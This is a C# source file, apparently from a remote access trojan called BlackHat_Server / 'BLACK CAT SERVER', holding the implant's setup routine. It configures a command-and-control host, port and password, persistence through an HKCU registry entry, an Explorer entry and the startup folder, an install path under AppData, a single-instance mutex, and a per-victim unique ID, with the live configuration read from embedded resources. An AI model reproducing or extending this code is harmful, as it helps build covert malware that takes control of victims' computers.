namespace BlackHat_Server
{
    internal class CreateStClient
    {
        public bool InitializeStClient()
        {
            var ru = new ResUtile();
            //TEST
            ST_Client.Instance.Port = 2401;
            ST_Client.Instance.Password = "cammello";
            ST_Client.Instance.Host = "127.0.0.1";

            ST_Client.Instance.bUseHKCU = false;
            ST_Client.Instance.bUseExplorer = false;
            ST_Client.Instance.bUseStartupFolder = false;

            ST_Client.Instance.sAppDataInstall = @"BLACK CAT SERVER\TEST\SERVER.EXE";
            ST_Client.Instance.sStartupFileName = @"SERVER.EXE";

            ST_Client.Instance.sExplorerEntry = "EXPLO";
            ST_Client.Instance.sHKCUEntry = "HKCU";

            ST_Client.Instance.sMutex = "MUTEX_TEST";


            //TEST

            // NORMAL

            //ST_Client.Instance.Port = ru.GetPort();
            //ST_Client.Instance.Password = ru.GetPsw();
            //ST_Client.Instance.Host = ru.GetHost();
            //ST_Client.Instance.ServerName = ru.GetServerName();
            //ST_Client.Instance.sMutex = ru.GetServerMutex();

            //// RECUPERO INFO INSTALLAZIONE
            //bool usehk, useex, usestart;
            //string apppath, startupfilename;
            //string hkcuEntry, exploEntry;

            //ru.GetInstallInfo(out usehk, out useex, out apppath, out usestart, out startupfilename, out hkcuEntry, out exploEntry);


            //ST_Client.Instance.bUseHKCU = usehk;
            //ST_Client.Instance.bUseExplorer = useex;
            //ST_Client.Instance.bUseStartupFolder = usestart;


            //ST_Client.Instance.sAppDataInstall = apppath;
            //ST_Client.Instance.sStartupFileName = startupfilename;

            //ST_Client.Instance.sHKCUEntry = hkcuEntry;
            //ST_Client.Instance.sExplorerEntry = exploEntry;

            //// ERRORE RECUPERO DATI DA RISORSE
            //if (ST_Client.Instance.Port == -1)
            //    Application.Exit();
            //if (ST_Client.Instance.Password == null)
            //    Application.Exit();
            //if (ST_Client.Instance.Host == null)
            //    Application.Exit();
            ////-----------------------------------

            // END NORMAL


            // GESTIONE SERVER NAME
            var rm = new RegistryManager();
            var td = new Text_Des();

            string servName;

            var regExist = rm.ExistServerNameEntry();

            if (regExist)
            {
                servName = td.Decrypt(rm.GetNameFromRegistry(), true);
            }
            else
            {
                servName = ru.GetServerName(); // LO PRENDO DALLE RISORSE LA PRIMA VOLTA

                if (servName == null)
                    servName = "NO NAME";

                rm.SetNewNameInRegistry(td.Encrypt(servName,
                    true)); // prima esecuzione setto il nome sul registro                
            }

            ST_Client.Instance.ServerName = servName;
            //-------------------------------------------------

            var uid = new UnivoqueID();
            ST_Client.Instance.UnivoqueID = uid.GetUnivoqueID(); // ASSEGNO IL CODICE UNIVOCO    

            return true;
        }
    }
}